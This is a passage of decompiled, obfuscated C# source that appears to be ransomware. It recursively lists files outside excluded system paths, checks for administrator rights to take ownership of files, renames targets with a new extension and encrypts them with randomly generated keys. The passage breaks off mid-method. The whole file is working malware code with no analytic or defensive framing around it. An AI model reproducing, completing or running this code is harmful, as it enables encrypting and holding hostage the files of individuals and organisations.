using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using bRkyiqQJSFr;
using lnpVMBSnDPe;
using oCAeNBwRVx;

namespace ybfSLIGKlaODvJ;

internal sealed class iWNOuKBWgwsf
{
	public sealed class DOsEpLcfrEO
	{
		private static StringCollection VkzdAGjSkiSbCJpo;

		private static List<string> CaLjNBvWdaj;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107404231));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107404194)) && !text.ToLower().Contains(getString_0(107404205)) && !text.ToLower().Contains(getString_0(107390003)) && !text.ToLower().Contains(getString_0(107389990)) && !text.ToLower().Contains(getString_0(107404160)) && !text.ToLower().Contains(getString_0(107389842)) && !text.ToLower().Contains(getString_0(107389239)) && !text.ToLower().Contains(getString_0(107389254)) && !text.ToLower().Contains(getString_0(107389205)) && !text.ToLower().Contains(getString_0(107389220)) && !text.ToLower().Contains(getString_0(107389154)) && !text.ToLower().Contains(getString_0(107389169)) && !text.ToLower().Contains(getString_0(107389120)) && !text.ToLower().Contains(getString_0(107389139)) && !text.ToLower().Contains(getString_0(107389086)) && !text.ToLower().Contains(getString_0(107389105)) && !text.ToLower().Contains(getString_0(107389092)) && !text.ToLower().Contains(getString_0(107389075)) && !text.ToLower().Contains(getString_0(107389538)) && !text.Contains(HnrHiFTDAEzVb(getString_0(107389553))) && !text.Contains(getString_0(107389496)) && !text.Contains(getString_0(107389515)) && !text.EndsWith(getString_0(107395410)) && !text.EndsWith(getString_0(107389478)) && !text.EndsWith(getString_0(107389441)) && !text.EndsWith(getString_0(107389436)) && !text.EndsWith(getString_0(107389431)) && !text.ToLower().Contains(getString_0(107389458)) && !text.ToLower().Contains(AlXvbFdlnNXOi))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(jAynPWDbXCIKzXxz) * 1024.0 * 1024.0 && WdmZVvJAGkn == getString_0(107396860))
							{
								CaLjNBvWdaj.Add(text);
							}
							else if (File.Exists(text) && WdmZVvJAGkn == getString_0(107397020))
							{
								CaLjNBvWdaj.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return CaLjNBvWdaj;
		}

		static DOsEpLcfrEO()
		{
			Strings.CreateGetStringDelegate(typeof(DOsEpLcfrEO));
			VkzdAGjSkiSbCJpo = new StringCollection();
			CaLjNBvWdaj = new List<string>();
		}
	}

	private sealed class TfFaQoqMPbFXcuw
	{
		public string JTGRBnDiuXphC;

		public bool _003CMain_003Eb__7(Process process_0)
		{
			return process_0.ProcessName == JTGRBnDiuXphC;
		}
	}

	private sealed class iNttnIpBMwz
	{
		public string[] BNqEbRJtAzN;

		public void _003CMain_003Eb__8()
		{
			sZZiKvvuSOPcQ.oetkkjIFJK(BNqEbRJtAzN);
		}
	}

	private sealed class fauaHzBRvWA
	{
		public string rvmYFiBIPish;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__1e(int int_0)
		{
			Thread.Sleep(IZRjbACZbN);
			bxAnSckylQQtw.Add(getString_0(107389392) + rvmYFiBIPish + getString_0(107397201) + (char)int_0 + getString_0(107404179));
			try
			{
				if (rjVAnmtTRGwdsGoP)
				{
					Console.WriteLine(getString_0(107389392) + rvmYFiBIPish + getString_0(107397201) + (char)int_0 + getString_0(107404179));
				}
			}
			catch
			{
			}
		}

		static fauaHzBRvWA()
		{
			Strings.CreateGetStringDelegate(typeof(fauaHzBRvWA));
		}
	}

	private sealed class AnuMykbEXRLdspfa
	{
		public string tYWkLyhrowG;

		public bool _003CIsDriveNTFS_003Eb__23(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == tYWkLyhrowG;
		}
	}

	private sealed class mVDRxhprWxh
	{
		private sealed class YnXTpzxqCPoej
		{
			public mVDRxhprWxh gcHbdKcxYfMKU;

			public string KvgyUYwPQEMcH;

			public void _003CCrypt_003Eb__2d()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					gzuABFpjzsBXl(WindowsIdentity.GetCurrent().Name, KvgyUYwPQEMcH);
				}
			}

			public void _003CCrypt_003Eb__2e()
			{
				urvqDrraKd(KvgyUYwPQEMcH, gcHbdKcxYfMKU.ExregTQqVbzs, gcHbdKcxYfMKU.acsTZIiNbXCOpEv, gcHbdKcxYfMKU.gTewCUcTGBbbz, gcHbdKcxYfMKU.hAIQNoQXeEDNR);
			}
		}

		public string[] ExregTQqVbzs;

		public string[] gTewCUcTGBbbz;

		public string hAIQNoQXeEDNR;

		public string acsTZIiNbXCOpEv;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__2c(string string_0)
		{
			YnXTpzxqCPoej CS_0024_003C_003E8__locals0 = new YnXTpzxqCPoej();
			CS_0024_003C_003E8__locals0.gcHbdKcxYfMKU = this;
			CS_0024_003C_003E8__locals0.KvgyUYwPQEMcH = string_0;
			if (MJkKDioyTKQW && !swuZnlPkVSzF().Contains(getString_0(107386955)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						gzuABFpjzsBXl(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.KvgyUYwPQEMcH);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (paHHgwLQtjlpi == getString_0(107396870))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					urvqDrraKd(CS_0024_003C_003E8__locals0.KvgyUYwPQEMcH, CS_0024_003C_003E8__locals0.gcHbdKcxYfMKU.ExregTQqVbzs, CS_0024_003C_003E8__locals0.gcHbdKcxYfMKU.acsTZIiNbXCOpEv, CS_0024_003C_003E8__locals0.gcHbdKcxYfMKU.gTewCUcTGBbbz, CS_0024_003C_003E8__locals0.gcHbdKcxYfMKU.hAIQNoQXeEDNR);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				urvqDrraKd(CS_0024_003C_003E8__locals0.KvgyUYwPQEMcH, ExregTQqVbzs, acsTZIiNbXCOpEv, gTewCUcTGBbbz, hAIQNoQXeEDNR);
			}
		}

		static mVDRxhprWxh()
		{
			Strings.CreateGetStringDelegate(typeof(mVDRxhprWxh));
		}
	}

	private sealed class xtcPtppfARaJuWs
	{
		private sealed class argzCettJfDWZ
		{
			public xtcPtppfARaJuWs IkKoTnSnjIE;

			public string HHLUHtxrPXAANh;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__3a()
			{
				foreach (string item in YXlceGYDfnj)
				{
					if (HHLUHtxrPXAANh.ToLower().EndsWith(item + IkKoTnSnjIE.uYKcRkbjPyG) && BMlICsewZHNNqOZxm == getString_0(107396881))
					{
						if (Convert.ToInt32(RVYOolFtuFdobqh) * 1024 * 1024 > new FileInfo(HHLUHtxrPXAANh).Length)
						{
							try
							{
								wdiXDjuJgNGJ.DCRZpKamZEizX(getString_0(107390212), getString_0(107390207), getString_0(107390162), HHLUHtxrPXAANh);
							}
							catch
							{
							}
						}
					}
					else if (HHLUHtxrPXAANh.ToLower().EndsWith(item) && BMlICsewZHNNqOZxm == getString_0(107397041))
					{
						try
						{
							wdiXDjuJgNGJ.DCRZpKamZEizX(getString_0(107390212), getString_0(107390207), getString_0(107390162), HHLUHtxrPXAANh);
						}
						catch
						{
						}
					}
				}
			}

			static argzCettJfDWZ()
			{
				Strings.CreateGetStringDelegate(typeof(argzCettJfDWZ));
			}
		}

		private sealed class zHykNUMLBYF
		{
			public xtcPtppfARaJuWs IkKoTnSnjIE;

			public string gfQBDTGvKHrdbzdx;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__3c()
			{
				foreach (string item in YXlceGYDfnj)
				{
					if (gfQBDTGvKHrdbzdx.ToLower().EndsWith(item + IkKoTnSnjIE.uYKcRkbjPyG) && BMlICsewZHNNqOZxm == getString_0(107396884))
					{
						if (Convert.ToInt32(RVYOolFtuFdobqh) * 1024 * 1024 > new FileInfo(gfQBDTGvKHrdbzdx).Length)
						{
							try
							{
								wdiXDjuJgNGJ.DCRZpKamZEizX(getString_0(107390215), getString_0(107390210), getString_0(107390165), gfQBDTGvKHrdbzdx);
							}
							catch
							{
							}
						}
					}
					else if (gfQBDTGvKHrdbzdx.ToLower().EndsWith(item) && BMlICsewZHNNqOZxm == getString_0(107397044))
					{
						try
						{
							wdiXDjuJgNGJ.DCRZpKamZEizX(getString_0(107390215), getString_0(107390210), getString_0(107390165), gfQBDTGvKHrdbzdx);
						}
						catch
						{
						}
					}
				}
			}

			static zHykNUMLBYF()
			{
				Strings.CreateGetStringDelegate(typeof(zHykNUMLBYF));
			}
		}

		public List<string> yWPREClwPTEqF;

		public List<string> wNdNDiAzKQBqV;

		public string uYKcRkbjPyG;

		public string[] odyeEpsXhVRV;

		public string rlUOZBzOokWP;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__39(string string_0)
		{
			argzCettJfDWZ CS_0024_003C_003E8__locals0;
			foreach (string item in wNdNDiAzKQBqV)
			{
				if (item.Contains(getString_0(107390064)) || item.Contains(getString_0(107390071)) || item.Contains(getString_0(107390038)) || item.ToLower().Contains(getString_0(107390021)) || item.ToLower().Contains(getString_0(107390008)) || item.Contains(getString_0(107389983)) || item.Contains(getString_0(107389930)) || item.ToLower().Contains(getString_0(107389949)) || item.ToLower().Contains(getString_0(107389904)) || item.ToLower().Contains(getString_0(107389867)) || item.ToLower().Contains(getString_0(107389890)) || item.ToLower().Contains(getString_0(107389841)) || item.ToLower().Contains(getString_0(107389847)) || item.ToLower().Contains(getString_0(107389314)) || item.Contains(getString_0(107389257)) || item.Contains(getString_0(107389272)) || item.Contains(getString_0(107389223)) || item.Contains(getString_0(107389238)) || item.Contains(getString_0(107389221)) || item.Contains(getString_0(107389172)) || item.Contains(getString_0(107389187)) || item.Contains(getString_0(107389138)) || item.Contains(getString_0(107389157)) || item.Contains(getString_0(107389104)) || item.ToLower().Contains(getString_0(107389123)) || item.ToLower().Contains(getString_0(107389110)) || item.ToLower().Contains(getString_0(107389093)) || item.ToLower().Contains(getString_0(107389556)) || item.Contains(HnrHiFTDAEzVb(getString_0(107389571))) || item.Contains(getString_0(107389514)) || item.Contains(getString_0(107397210)) || item.Contains(getString_0(107389533)) || item.EndsWith(uYKcRkbjPyG) || item.EndsWith(getString_0(107389496)) || item.EndsWith(getString_0(107389459)) || item.EndsWith(getString_0(107389454)) || item.EndsWith(getString_0(107389449)) || item.Contains(getString_0(107389476)) || item.Contains(AlXvbFdlnNXOi) || item.Contains(ZOToawIMfprr) || item.Contains(fnEjkTZXUzKS))
				{
					continue;
				}
				if (odyeEpsXhVRV.Length != 0)
				{
					string[] array = odyeEpsXhVRV;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0e2a;
					}
				}
				try
				{
					if (item.EndsWith(uYKcRkbjPyG))
					{
						goto IL_0e2a;
					}
				}
				catch (Exception)
				{
					goto IL_0e2a;
				}
				if (!item.EndsWith(string_0) || gHJtQxzOYMxb.Contains(item))
				{
					continue;
				}
				if (JuoxaLNRiTYHeY == getString_0(107396878))
				{
					try
					{
						if (CHfiOAUpccl.fhCAURzyMsnRokFU(item))
						{
							CHfiOAUpccl.zMWyOqfMOtzftHw(item);
						}
					}
					catch
					{
					}
				}
				gHJtQxzOYMxb.Add(item);
				if (!mRCgNmhiRqq.Contains(Path.GetDirectoryName(item)))
				{
					mRCgNmhiRqq.Add(Path.GetDirectoryName(item));
				}
				JxJsKmGJSdnj(item);
				try
				{
					new tSjEsjVhFLRDyuWQ().mfWczWUMLYhnzT(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (rjVAnmtTRGwdsGoP)
							{
								Console.WriteLine(getString_0(107404188) + item + getString_0(107403599) + new FileInfo(item).Length + getString_0(107403610));
								Console.WriteLine(getString_0(107403569));
							}
						}
						catch
						{
						}
						iDwobxXLVYBDUs(HnrHiFTDAEzVb(getString_0(107403464)), getString_0(107389360) + item + getString_0(107389360) + HnrHiFTDAEzVb(getString_0(107403439)) + getString_0(107389360) + Environment.UserName + getString_0(107389360) + HnrHiFTDAEzVb(getString_0(107403454)));
					}
				}
				catch (Exception ex2)
				{
					if (eCrtUqxUXqEDfkG)
					{
						try
						{
							File.AppendAllText(ZOToawIMfprr, getString_0(107386617) + item + getString_0(107403429) + ex2.Message + getString_0(107396281));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (eCrtUqxUXqEDfkG)
						{
							try
							{
								File.AppendAllText(ZOToawIMfprr, getString_0(107386617) + item + getString_0(107403828) + ex4.Message + getString_0(107396281));
							}
							catch (Exception)
							{
							}
						}
						cMPsaAWwrrbpa++;
						goto end_IL_0716;
					}
					if (loDvPGrZMBwOJMj == getString_0(107396878) && new FileInfo(item).Length > Convert.ToInt32(ThqgRSrzuFx) * 1024 * 1024 && !yWPREClwPTEqF.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new argzCettJfDWZ();
						CS_0024_003C_003E8__locals0.IkKoTnSnjIE = this;
						try
						{
							if (uYKcRkbjPyG != getString_0(107386882))
							{
								if (FjsJwHpFzPmVq)
								{
									uYKcRkbjPyG = WxVPvEgBcYyDLSq + uYKcRkbjPyG;
								}
								File.Move(item, item + uYKcRkbjPyG);
							}
						}
						catch (Exception ex6)
						{
							if (eCrtUqxUXqEDfkG)
							{
								try
								{
									File.AppendAllText(ZOToawIMfprr, getString_0(107386617) + item + getString_0(107403799) + ex6.Message + getString_0(107396281));
								}
								catch (Exception)
								{
								}
							}
							cMPsaAWwrrbpa++;
							goto end_IL_0716;
						}
						CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh = getString_0(107390096);
						if (uYKcRkbjPyG != getString_0(107386882))
						{
							CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh = item + uYKcRkbjPyG;
						}
						else
						{
							CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh = item;
						}
						if (grVWpVNxmvUXt == getString_0(107396878))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in YXlceGYDfnj)
								{
									if (CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.IkKoTnSnjIE.uYKcRkbjPyG) && BMlICsewZHNNqOZxm == argzCettJfDWZ.getString_0(107396881))
									{
										if (Convert.ToInt32(RVYOolFtuFdobqh) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh).Length)
										{
											try
											{
												wdiXDjuJgNGJ.DCRZpKamZEizX(argzCettJfDWZ.getString_0(107390212), argzCettJfDWZ.getString_0(107390207), argzCettJfDWZ.getString_0(107390162), CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh.ToLower().EndsWith(item2) && BMlICsewZHNNqOZxm == argzCettJfDWZ.getString_0(107397041))
									{
										try
										{
											wdiXDjuJgNGJ.DCRZpKamZEizX(argzCettJfDWZ.getString_0(107390212), argzCettJfDWZ.getString_0(107390207), argzCettJfDWZ.getString_0(107390162), CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = VEEBlwVfMrF.psRYhOyItCIDHrZ(32);
						string s = gXnOfppahrNWi.sBDlGorhadqnmxr(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (dtBtLrowijPwW == getString_0(107397038))
						{
							byte[] array2 = null;
							byte[] byte_ = wZhxBLOUELLD.YyvEaXvrgGWE(CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh, Convert.ToInt32(ThqgRSrzuFx) * 1024 * 1024);
							if (wZhxBLOUELLD.kFTEsbJnnwQZ(ZuPICqOHsAezK: (!JQllwusRFZbJU) ? (sFwpaHIPJDNK ? wZhxBLOUELLD.TWWzYeNNrdZT(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : wZhxBLOUELLD.TWWzYeNNrdZT(byte_, Encoding.ASCII.GetBytes(rlUOZBzOokWP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (sFwpaHIPJDNK ? eihvGbfwnIee.kXimjkJppApPOW(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : eihvGbfwnIee.kXimjkJppApPOW(byte_, Encoding.ASCII.GetBytes(rlUOZBzOokWP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), lMQywbZRpEOBbR: CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh, iPDawhgBDCF: bytes))
							{
								goto IL_0e2a;
							}
							try
							{
								File.Move(item + uYKcRkbjPyG, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!sFwpaHIPJDNK)
						{
							if (eQDWwInDCVt.MzXnLHyJOA(CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh, ThqgRSrzuFx, rlUOZBzOokWP))
							{
								goto IL_0e2a;
							}
							try
							{
								File.Move(item + uYKcRkbjPyG, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (eQDWwInDCVt.MzXnLHyJOA(CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh, ThqgRSrzuFx, text, bytes))
							{
								goto IL_0e2a;
							}
							try
							{
								File.Move(item + uYKcRkbjPyG, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (FjsJwHpFzPmVq)
					{
						uYKcRkbjPyG = WxVPvEgBcYyDLSq + uYKcRkbjPyG;
					}
					string text2 = VEEBlwVfMrF.psRYhOyItCIDHrZ(32);
					string s2 = gXnOfppahrNWi.sBDlGorhadqnmxr(text2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (uYKcRkbjPyG != getString_0(107386882))
					{
						if (!lLDISlXAEBoGjsf)
						{
							if (!sFwpaHIPJDNK)
							{
								nIyfuHCZss(item, item + uYKcRkbjPyG, FlUpRKIMpc);
							}
							else
							{
								nIyfuHCZss(item, item + uYKcRkbjPyG, Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!sFwpaHIPJDNK)
								{
									nOFFyaCnYAwSb(item, item + uYKcRkbjPyG, FlUpRKIMpc);
								}
								else
								{
									nOFFyaCnYAwSb(item, item + uYKcRkbjPyG, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex11)
							{
								if (eCrtUqxUXqEDfkG)
								{
									try
									{
										File.AppendAllText(ZOToawIMfprr, getString_0(107386617) + item + getString_0(107386836) + ex11.Message + getString_0(107396281));
									}
									catch (Exception)
									{
									}
								}
								cMPsaAWwrrbpa++;
								try
								{
									File.Move(item + uYKcRkbjPyG, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_0716;
							}
						}
					}
					else if (!lLDISlXAEBoGjsf)
					{
						if (!sFwpaHIPJDNK)
						{
							nIyfuHCZss(item, item + getString_0(107386877), FlUpRKIMpc);
						}
						else
						{
							nIyfuHCZss(item, item + getString_0(107386877), Encoding.ASCII.GetBytes(text2));
						}
					}
					else
					{
						try
						{
							if (!sFwpaHIPJDNK)
							{
								nOFFyaCnYAwSb(item, item, FlUpRKIMpc);
							}
							else
							{
								nOFFyaCnYAwSb(item, item, Encoding.ASCII.GetBytes(text2));
							}
						}
						catch (Exception ex14)
						{
							if (eCrtUqxUXqEDfkG)
							{
								try
								{
									File.AppendAllText(ZOToawIMfprr, getString_0(107386617) + item + getString_0(107386836) + ex14.Message + getString_0(107396281));
								}
								catch (Exception)
								{
								}
							}
							cMPsaAWwrrbpa++;
							goto end_IL_0716;
						}
					}
					if (sFwpaHIPJDNK)
					{
						if (uYKcRkbjPyG != getString_0(107386882))
						{
							dnVJbaOwGkkjKGJ(item + uYKcRkbjPyG, bytes2);
						}
						else
						{
							dnVJbaOwGkkjKGJ(item, bytes2);
						}
					}
					goto IL_0e2a;
					end_IL_0716:;
				}
				catch (Exception)
				{
					goto IL_0e2a;
				}
				continue;
				IL_0e2a:
				wNdNDiAzKQBqV.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__3b(string string_0)
		{
			zHykNUMLBYF CS_0024_003C_003E8__locals0 = new zHykNUMLBYF();
			CS_0024_003C_003E8__locals0.IkKoTnSnjIE = this;
			CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx = string_0;
			if (!CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107390064)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107390071)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107390038)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(getString_0(107390021)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(getString_0(107390008)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107389983)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107389930)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(getString_0(107389949)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(getString_0(107389904)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(getString_0(107389867)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(getString_0(107389890)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(getString_0(107389841)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(getString_0(107389847)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(getString_0(107389314)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107389257)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107389272)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107389223)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107389238)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107389221)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107389172)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107389187)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107389138)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107389157)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107389104)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(getString_0(107389123)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(getString_0(107389110)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(getString_0(107389093)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(getString_0(107389556)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(HnrHiFTDAEzVb(getString_0(107389571))) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107389514)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107397210)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107389533)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.EndsWith(uYKcRkbjPyG) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.EndsWith(getString_0(107389496)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.EndsWith(getString_0(107389459)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.EndsWith(getString_0(107389454)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.EndsWith(getString_0(107389449)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(getString_0(107389476)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(AlXvbFdlnNXOi) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(ZOToawIMfprr) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(fnEjkTZXUzKS))
			{
				if (odyeEpsXhVRV.Length != 0)
				{
					string[] array = odyeEpsXhVRV;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1000;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.EndsWith(uYKcRkbjPyG))
					{
						goto IL_1000;
					}
				}
				catch (Exception)
				{
					goto IL_1000;
				}
				if (!gHJtQxzOYMxb.Contains(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx))
				{
					if (JuoxaLNRiTYHeY == getString_0(107396878))
					{
						try
						{
							if (CHfiOAUpccl.fhCAURzyMsnRokFU(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx))
							{
								CHfiOAUpccl.zMWyOqfMOtzftHw(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
							}
						}
						catch
						{
						}
					}
					gHJtQxzOYMxb.Add(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
					if (!mRCgNmhiRqq.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx)))
					{
						mRCgNmhiRqq.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx));
					}
					JxJsKmGJSdnj(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
					try
					{
						new tSjEsjVhFLRDyuWQ().mfWczWUMLYhnzT(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (rjVAnmtTRGwdsGoP)
								{
									Console.WriteLine(getString_0(107404188) + CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + getString_0(107403599) + new FileInfo(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx).Length + getString_0(107403610));
									Console.WriteLine(getString_0(107403569));
								}
							}
							catch
							{
							}
							iDwobxXLVYBDUs(HnrHiFTDAEzVb(getString_0(107403464)), getString_0(107389360) + CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + getString_0(107389360) + HnrHiFTDAEzVb(getString_0(107403439)) + getString_0(107389360) + Environment.UserName + getString_0(107389360) + HnrHiFTDAEzVb(getString_0(107403454)));
						}
					}
					catch (Exception ex2)
					{
						if (eCrtUqxUXqEDfkG)
						{
							try
							{
								File.AppendAllText(ZOToawIMfprr, getString_0(107386617) + CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + getString_0(107403429) + ex2.Message + getString_0(107396281));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx).Length != 0L)
							{
								goto end_IL_085c;
							}
							goto end_IL_085c_2;
							end_IL_085c:;
						}
						catch (Exception ex4)
						{
							if (eCrtUqxUXqEDfkG)
							{
								try
								{
									File.AppendAllText(ZOToawIMfprr, getString_0(107386617) + CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + getString_0(107403828) + ex4.Message + getString_0(107396281));
								}
								catch (Exception)
								{
								}
							}
							cMPsaAWwrrbpa++;
							goto end_IL_085c_2;
						}
